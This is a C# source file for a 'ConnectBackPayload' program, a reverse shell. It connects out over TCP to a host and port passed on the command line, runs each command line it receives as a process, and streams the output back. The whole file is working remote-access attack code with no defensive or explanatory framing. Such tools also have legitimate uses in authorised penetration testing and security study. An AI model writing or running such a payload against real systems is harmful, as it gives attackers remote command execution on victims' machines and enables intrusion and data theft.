using System;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net.Sockets;
using System.Security.Cryptography;
using System.Text;

namespace ConnectBackPayload
{
    class Program
    {
        static void Main(string[] args)
        {
            try
            {
                string url;
                string port;

                try
                {
                    url = args[0];
                    port = args[1];
                }
                catch
                {
                    throw new Exception(string.Format("Usage: {0} URL PORT\n",
                        System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName));
                }

                using (TcpClient client = new TcpClient(args[0], int.Parse(args[1])))
                {
                    using (Stream stream = client.GetStream())
                    {
                        using (StreamReader rdr = new StreamReader(stream))
                        {
                            while (true)
                            {
                                string cmd = rdr.ReadLine();

                                if (string.IsNullOrEmpty(cmd))
                                {
                                    rdr.Close();
                                    stream.Close();
                                    client.Close();
                                    continue;
                                }

                                if (string.IsNullOrWhiteSpace(cmd))
                                    continue;

                                string[] split = cmd.Trim().Split(' ');
                                string filename = split.First();
                                string arg = string.Join(" ", split.Skip(1));

                                try
                                {
                                    Process prc = new Process();
                                    prc.StartInfo = new ProcessStartInfo();
                                    prc.StartInfo.FileName = filename;
                                    prc.StartInfo.Arguments = arg;
                                    prc.StartInfo.UseShellExecute = false;
                                    prc.StartInfo.RedirectStandardOutput = true;
                                    prc.Start();
                                    prc.StandardOutput.BaseStream.CopyTo(stream);
                                    prc.WaitForExit();
                                }
                                catch
                                {
                                    string error = string.Format("Error running command {0}\n", cmd);
                                    byte[] errorBytes = Encoding.ASCII.GetBytes(error);
                                    stream.Write(errorBytes, 0, errorBytes.Length);
                                }
                            }
                        }
                    }
                }
            }
            catch (Exception e)
            {
                Console.WriteLine(e.Message);
            }
        }
    }
}